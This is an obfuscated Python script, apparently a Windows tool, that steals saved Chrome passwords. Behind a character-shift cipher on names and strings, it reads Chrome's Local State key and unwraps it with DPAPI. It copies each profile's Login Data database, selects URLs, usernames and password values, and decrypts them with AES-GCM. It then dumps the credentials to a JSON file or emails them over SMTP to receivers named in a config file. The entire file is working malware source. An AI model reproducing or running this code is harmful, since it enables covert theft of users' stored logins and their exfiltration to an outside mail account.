# Obfuscated with PyObfx #
from pathlib import Path as LHoVENtj
import yaml as mQaPXiYD
from typing import Dict as yZHXTROv
from typing import  Union as FkjlBSzXci
import os as tCYI
import sys as BixIlW
import smtplib as MruSUGKhwLtlPO
from email.mime.text import MIMEText as lYwtLSjXGRVQpsHz
import re as bEUs
import json as VPsKpQqS
import base64 as OPAJFsNEmwhy
import sqlite3 as SXrtxLcMmWsAEG
import win32crypt as SxhFibBluYCPIyGsAaEH
from Cryptodome.Cipher import AES as GzuhcM
import shutil as YmvaVThAZdBn

WOQMofZFPz = lambda n: (n + (4 + 3)) / 1
lQdTExZcHM = lambda s: ''.join(chr(int(WOQMofZFPz(ord(c)))) for c in s)
jmFHeQWanopRfIwADE = tCYI.path.dirname(tCYI.path.realpath(BixIlW.argv[int(WOQMofZFPz(-7))]))
# 方便混淆
dRLkcaSDQtgmBqoViEnCsHGxbweMrJlZApzv = tCYI.environ[lQdTExZcHM("NL>KIKH?BE>")]
lpFyXRxzKTCbiwgnrfWdGaMSNAqkQjIZPEOs = lQdTExZcHM("UU:ii=ZmZUUEh\ZeUU@hh`e^UU<akhf^UUNl^k=ZmZ")


def TaVFoevISXPHkwAYjy(pNrcKMYZIQOGfjeuyw: FkjlBSzXci[str, LHoVENtj]) -> yZHXTROv:
    WcpEqTZRkwFyzNxv = getattr(BixIlW, lQdTExZcHM("XF>BI:LL"), tCYI.path.dirname(tCYI.path.abspath(__file__)))
    OtPLcgDpzhSsQHBWAkFCGq = tCYI.path.join(WcpEqTZRkwFyzNxv, pNrcKMYZIQOGfjeuyw)
    with open(OtPLcgDpzhSsQHBWAkFCGq, lQdTExZcHM("k[")) as DA:
        oYRvAuKk = mQaPXiYD.load(DA, Loader=mQaPXiYD.Loader)
    if lQdTExZcHM("bg\en]^") in oYRvAuKk:
        ZODQNXPhvmwTrn = oYRvAuKk.pop(lQdTExZcHM("bg\en]^"))
        if isinstance(ZODQNXPhvmwTrn, str):
            ZODQNXPhvmwTrn = [ZODQNXPhvmwTrn]
        for ph in ZODQNXPhvmwTrn:
            oYRvAuKk.update(TaVFoevISXPHkwAYjy(LHoVENtj(OtPLcgDpzhSsQHBWAkFCGq).parent / ph))
    return oYRvAuKk

# 获取打包后可执行文件所在的目录

qeCtiXFrRgLk = TaVFoevISXPHkwAYjy(lQdTExZcHM("\hg_b`\'rZfe"))

def WCzicXGQaZKrIOtSqgyE(vYjSOdBnmy,IrbAiY):
    CvouExSFXmePaQ = lYwtLSjXGRVQpsHz(IrbAiY,lQdTExZcHM("ieZbg"),lQdTExZcHM("nm_&1"))
    CvouExSFXmePaQ[lQdTExZcHM("Ln[c^\m")] = vYjSOdBnmy 
    CvouExSFXmePaQ[lQdTExZcHM("?khf")] = qeCtiXFrRgLk[lQdTExZcHM("^fZbe")][lQdTExZcHM("l^g]^k")]   
    CvouExSFXmePaQ[lQdTExZcHM("Mh")] = qeCtiXFrRgLk[lQdTExZcHM("^fZbe")][lQdTExZcHM("k^\^bo^kl")] 
    try:
        WOVUbljNCAoBuy = MruSUGKhwLtlPO.SMTP() 
        WOVUbljNCAoBuy.connect(qeCtiXFrRgLk[lQdTExZcHM("^fZbe")][lQdTExZcHM("ahlm")],int(WOQMofZFPz(18)))
        WOVUbljNCAoBuy.login(qeCtiXFrRgLk[lQdTExZcHM("^fZbe")][lQdTExZcHM("nl^k")],qeCtiXFrRgLk[lQdTExZcHM("^fZbe")][lQdTExZcHM("iZll")]) 
        WOVUbljNCAoBuy.sendmail(qeCtiXFrRgLk[lQdTExZcHM("^fZbe")][lQdTExZcHM("l^g]^k")],[qeCtiXFrRgLk[lQdTExZcHM("^fZbe")][lQdTExZcHM("k^\^bo^kl")]],CvouExSFXmePaQ.as_string()) 
        WOVUbljNCAoBuy.quit() 
    except Exception as tA:
        print(tA)
  
def wOJvmfRMBldHiTqWcunUYKDhASjENyexstIF():
    try:
        KkdbflTJsgmHjCwZUWFBDoOqIxGNaMti = dRLkcaSDQtgmBqoViEnCsHGxbweMrJlZApzv + lpFyXRxzKTCbiwgnrfWdGaMSNAqkQjIZPEOs
        iVMzBIUtdlJXuxphoNfyAZvFWjwECQ = tCYI.path.normpath(tCYI.path.join(KkdbflTJsgmHjCwZUWFBDoOqIxGNaMti, lQdTExZcHM("Eh\ZeLmZm^")))
        XfzCOrDiINYRbxmeMq = tCYI.path.join(jmFHeQWanopRfIwADE,lQdTExZcHM("\'(m^fi"))
        YmvaVThAZdBn.copy(iVMzBIUtdlJXuxphoNfyAZvFWjwECQ, XfzCOrDiINYRbxmeMq)
        with open(XfzCOrDiINYRbxmeMq, lQdTExZcHM("k"), encoding=lQdTExZcHM("nm_&1")) as DA:
            WjFvJaKzxpTDtIdXArOwYf = DA.read()
            WjFvJaKzxpTDtIdXArOwYf = VPsKpQqS.loads(WjFvJaKzxpTDtIdXArOwYf)
        HrQxTMgocXwZWKBGaiLS = OPAJFsNEmwhy.b64decode(WjFvJaKzxpTDtIdXArOwYf[lQdTExZcHM("hlX\krim")][lQdTExZcHM("^g\krim^]Xd^r")])
        HrQxTMgocXwZWKBGaiLS = HrQxTMgocXwZWKBGaiLS[int(WOQMofZFPz(-2)):] 
        HrQxTMgocXwZWKBGaiLS = SxhFibBluYCPIyGsAaEH.CryptUnprotectData(HrQxTMgocXwZWKBGaiLS, None, None, None, int(WOQMofZFPz(-7)))[int(WOQMofZFPz(-6))]
        tCYI.remove(XfzCOrDiINYRbxmeMq)
        return HrQxTMgocXwZWKBGaiLS
    except Exception as tA:
        if tCYI.path.exists(lQdTExZcHM("m^fi")):
            tCYI.remove(lQdTExZcHM("m^fi"))
        return None
    

def fYdHtFnWvhyaGLobJQumCIjSsqUXpV(MClqFNLgkSyA, GjSAziUMnCrFgx):
    return MClqFNLgkSyA.decrypt(GjSAziUMnCrFgx)

def IWXDkPOFfsJVRqEATnhBQiCKjdGmgu(PVfUloYJmrXpwC, GCed):
    return GzuhcM.new(PVfUloYJmrXpwC, GzuhcM.MODE_GCM, GCed)

def kKUCfuEdsWYmTabojRXSqrVegPAOGMwl(tzhSrYEblMspgFUNQnvK, HrQxTMgocXwZWKBGaiLS):
    try:
        QKPzifNyYLUpDjHBTwJOkVmouglXFAMsdteSGrZcRa = tzhSrYEblMspgFUNQnvK[int(WOQMofZFPz(-4)):int(WOQMofZFPz(8))]
        HDqweltjUvVcybnNxAMIXEJkogSrmLOdRWYp = tzhSrYEblMspgFUNQnvK[int(WOQMofZFPz(8)):-int(WOQMofZFPz(9))]
        MClqFNLgkSyA = IWXDkPOFfsJVRqEATnhBQiCKjdGmgu(HrQxTMgocXwZWKBGaiLS, QKPzifNyYLUpDjHBTwJOkVmouglXFAMsdteSGrZcRa)
        tqVGmsOyuPACRMapXNehiboZBIJU = fYdHtFnWvhyaGLobJQumCIjSsqUXpV(MClqFNLgkSyA, HDqweltjUvVcybnNxAMIXEJkogSrmLOdRWYp)
        tqVGmsOyuPACRMapXNehiboZBIJU = tqVGmsOyuPACRMapXNehiboZBIJU.decode()  
        return tqVGmsOyuPACRMapXNehiboZBIJU
    except Exception as tA:
        return ""

if __name__ == lQdTExZcHM("XXfZbgXX"):
    # try:
        VwEslWIdNLPFChArnRMoSitqQGUZ = wOJvmfRMBldHiTqWcunUYKDhASjENyexstIF()
        wGUkcQfmYTEJNe = tCYI.path.normpath(dRLkcaSDQtgmBqoViEnCsHGxbweMrJlZApzv + lpFyXRxzKTCbiwgnrfWdGaMSNAqkQjIZPEOs)
        ZyhUIwmPksWnCM = [tpfEMHDmTqnlLd for tpfEMHDmTqnlLd in tCYI.listdir(wGUkcQfmYTEJNe) if bEUs.search(lQdTExZcHM("WIkh_be^#uW=^_Znem"),tpfEMHDmTqnlLd)!=None]
        fDOoyYQcSqlUEIBk = []
        for oNclpKqMOiuI in ZyhUIwmPksWnCM:
            QvhsSnyEIbzcBFdUjYGDotNfMCgm = tCYI.path.normpath(tCYI.path.join(wGUkcQfmYTEJNe, oNclpKqMOiuI,lQdTExZcHM("Eh`bg=ZmZ")))
            try:
                QLGzecYtMomFAfyxNZOJBjRl = tCYI.path.join(jmFHeQWanopRfIwADE,lQdTExZcHM("\'(m^fi\']["))
                YmvaVThAZdBn.copy2(QvhsSnyEIbzcBFdUjYGDotNfMCgm, QLGzecYtMomFAfyxNZOJBjRl) 
                MSzfgoPT = SXrtxLcMmWsAEG.connect(QLGzecYtMomFAfyxNZOJBjRl)
            except Exception as tA:
                print(lQdTExZcHM("敩捧庌扌廹太贞3").format(tA))
                exit(int(WOQMofZFPz(-7)))
            if(VwEslWIdNLPFChArnRMoSitqQGUZ and MSzfgoPT):
                AOseYwXZuVMo = MSzfgoPT.cursor()
                AOseYwXZuVMo.execute(lQdTExZcHM("L>E><MZ\mbhgXnke%nl^kgZf^XoZen^%iZllphk]XoZen^?KHFeh`bgl"))
                for CakrUPinld,OwLQVGDRYo in enumerate(AOseYwXZuVMo.fetchall()):
                    XZxuDU = {}
                    XZxuDU[lQdTExZcHM("nke")] = OwLQVGDRYo[int(WOQMofZFPz(-7))]
                    XZxuDU[lQdTExZcHM("nl^kgZf^")] = OwLQVGDRYo[int(WOQMofZFPz(-6))]
                    uCXTaBsOVvIP = OwLQVGDRYo[int(WOQMofZFPz(-5))]
                    if(XZxuDU[lQdTExZcHM("nke")] !="" and XZxuDU[lQdTExZcHM("nl^kgZf^")]!="" and uCXTaBsOVvIP!=""):
                        nd = kKUCfuEdsWYmTabojRXSqrVegPAOGMwl(uCXTaBsOVvIP, VwEslWIdNLPFChArnRMoSitqQGUZ)
                        XZxuDU[lQdTExZcHM("i")] = nd
                        fDOoyYQcSqlUEIBk.append(XZxuDU)
                AOseYwXZuVMo.close()
                MSzfgoPT.close()
                tCYI.remove(QLGzecYtMomFAfyxNZOJBjRl)  

        if(qeCtiXFrRgLk[lQdTExZcHM("hnminm")][lQdTExZcHM("clhg")] == lQdTExZcHM("HG")):
            with open(tCYI.path.join(jmFHeQWanopRfIwADE,lQdTExZcHM("hnminm\'clhg")),lQdTExZcHM("p"),encoding=lQdTExZcHM("nm_&1")) as DA:
                    VPsKpQqS.dump(fDOoyYQcSqlUEIBk,DA,ensure_ascii=bool(int(WOQMofZFPz(-6))),indent=int(WOQMofZFPz(-3)))
        if(qeCtiXFrRgLk[lQdTExZcHM("hnminm")][lQdTExZcHM("^fZbe")] == lQdTExZcHM("HG")):
           WCzicXGQaZKrIOtSqgyE(lQdTExZcHM("\akhf^"),str(fDOoyYQcSqlUEIBk))
        
    # except:
    #     input("按任意键退出")
    
